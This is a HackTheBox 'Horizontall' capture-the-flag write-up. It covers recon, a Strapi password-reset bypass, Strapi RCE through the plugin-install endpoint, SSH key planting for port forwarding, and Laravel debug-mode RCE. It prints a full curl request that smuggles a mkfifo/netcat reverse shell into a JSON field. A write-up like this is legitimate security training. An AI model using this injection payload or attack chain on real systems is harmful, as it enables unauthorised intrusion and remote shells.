# HackTheBox-Horizontall

## NMAP

```bash

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:                                                            
|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA) 
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDL2qJTqj1aoxBGb8yWIN4UJwFs4/UgDEutp3aiL2/6yV2iE78YjGzfU74VKlTRvJZWBwDmIOosOBNl9nfmEzXerD0g5lD5SporBx06eWX/XP
2sQSEKbsqkr7Qb4ncvU8CvDR6yGHxmBT8WGgaQsA2ViVjiqAdlUDmLoT2qA3GeLBQgS41e+TysTpzWlY7z/rf/u0uj/C3kbixSB/upkWoqGyorDtFoaGGvWet/q7j5Tq061MaR6cM2CrYcQxxnPy
4LqFE3MouLklBXfmNovryI0qVFMki7Cc3hfXz6BmKppCzMUPs8VgtNgdcGywIU/Nq1aiGQfATneqDD2GBXLjzV
|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIyw6WbPVzY28EbBOZ4zWcikpu/CPcklbTUwvrPou4dCG4koataOo/RDg4MJuQP+sR937/ugmI
NBJNsYC8F7jN0=
|   256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJqmDVbv9RjhlUzOMmw3SrGPaiDBgdZ9QZ2cKM49jzYB
80/tcp open  http    syn-ack ttl 63 nginx 1.14.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Did not follow redirect to http://horizontall.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## PORT 80 (HTTP)

When visit the web server it's going to redirect us to `horizontall.htb` so let's add this in `/etc/hots` file

<img src="https://i.imgur.com/iXmy3g5.png"/>

<img src="https://i.imgur.com/7LGU6SW.png"/>

<img src="https://i.imgur.com/7o2LTmd.png"/>

We can see from the icon on title bar it's from `Vue.js` which is a javascript framework. At the bottom of the web page we can see a contact form

<img src="https://i.imgur.com/W0tF6Eu.png"/>

But on clicking the send button it doesn't do anything

<img src="https://i.imgur.com/7Hplk9W.png"/>

I tried to poke around the website manually but didn't find anything so ran `nikto` scan but it didn't showed anything interesting other than nginx version which we already saw from nmap scan

<img src="https://i.imgur.com/bomD3tS.png"/>

Tried fuzzing for files using `gobuster` and `ffuf` but they failed as the connection was timing out whenever I ran the tool again to look for any subdomains but it failed so I tired to look around in javascript files

<img src="https://i.imgur.com/GjP9CYs.png"/>

This javascript file gave us a subdomain so let's add and see where it takes

<img src="https://i.imgur.com/InsO8xV.png"/>

From wappalyzer results it seems this is scrapi cms  so search for any vulnerabilties I saw synack listed some we can also verify the version for strapi

<img src="https://i.imgur.com/FnikfHc.png"/>

Version is 3.0.0-beta.17.4 so we are on the right track

<img src="https://i.imgur.com/kI6SLdU.png"/>

<img src="https://i.imgur.com/T65s0z8.png"/>

Let's try visting the link 

<img src="https://i.imgur.com/hed1ubL.png"/>

Here it asks us for the admin credentials so let's try `admin:admin` but this failed , going back to vulnerabilites page we can see `Improper Access Control` , there's a flaw in javascript files which doesn't properly handle password resets so we can reset the password of any user in this case "admin".

<imgs src="https://i.imgur.com/xlDlAwc.png"/>

So I found a python script after goolging for password reset  which can reset a user's password by supplying a vaid username , the IP address and the new password which we want to set

<img src="https://i.imgur.com/71d1Cr2.png"/>

<img src="https://i.imgur.com/cMbMs3j.png"/>

<img src="https://i.imgur.com/c0j5SOI.png"/>

And we are in the admin panel

<img src="https://i.imgur.com/My07zmH.png"/>

Now focusing on getting a rce I found another article related to it

<img src="https://i.imgur.com/7XnzWXw.png"/>

```bash
curl -i -s -k -X $'POST' -H $'Host: localhost:1337' -H $'Authorization: Bearer [jwt]' -H $'Content-Type: application/json' -H $'Origin: http://localhost:1337' -H $'Content-Length: 123' -H $'Connection: close' --data $'{\"plugin\":\"documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 4444 >/tmp/f)\",\"port\":\"1337\"}' $'http://localhost:1337/admin/plugins/install'

```

Here we need to use the jwt token which got after password reset so we need to use it there

<img src="https://i.imgur.com/CAusuoe.png"/>

I used `--proxy` as I was getting bad request error because at then end of json `}` was missing so I added that in burp suite and got a shell

<img src="https://i.imgur.com/TITsj8J.png"/>

Stabilize the shell with `python3`

<img src="https://i.imgur.com/pvB5zQ7.png"/>

If we take a look at local ports with `ss -tulpn` (socket status) , we'll see two local ports on which a web page is running

<img src="https://i.imgur.com/aNIvjsk.png"/>

The web page on port 1337 is the one we saw `api-prod` subdomain so , we'll need port forawrd 8000 , we can do this through ssh local port forwarding by including our public key in `authroized_keys` file so we can login with our private key

<img src="https://i.imgur.com/Ou2fo3H.png"/>

<img src="https://i.imgur.com/mLf7cw7.png"/>

<img src="https://i.imgur.com/e3ll4NC.png"/>

Let's try to do port forwarding through ssh

<img src="https://i.imgur.com/mTSCwY4.png"/>

<img src="https://i.imgur.com/2TtbfEq.png"/>

<img src="https://i.imgur.com/9QrmsQS.png"/>

This shows us the laravel version so there must be a CVE for this as well, we can check if the laravel applicaiton is running in debugging mode by visiting `/profiles`

<img src="https://i.imgur.com/vHgLPHT.png"/>

<img src="https://i.imgur.com/AVPwkJO.png"/>

Perfect now by following the way to exploit deubg mode to get remote code execution

<img src="https://i.imgur.com/n0M3k4F.png"/>

Clone these two repositories

<img src="https://i.imgur.com/UYOJ1Wv.png"/>

First we'll going to make a file with `ls` command being executed than run that PHAR file against the python script

<img src="https://i.imgur.com/DysAr8T.png"/>

<img src="https://i.imgur.com/wZofJiK.png"/>

And the rce works so now we can get a reverse shell by including the netcat payload

<img src="https://i.imgur.com/jUwB35J.png"/>

<img src="https://i.imgur.com/ohQBz96.png"/>


## References

- https://thatsn0tmysite.wordpress.com/2019/11/15/x05/
- https://bittherapy.net/post/strapi-framework-remote-code-execution/
- https://github.com/ambionics/laravel-exploits
- https://github.com/ambionics/phpggc.git
- https://www.ambionics.io/blog/laravel-debug-rce
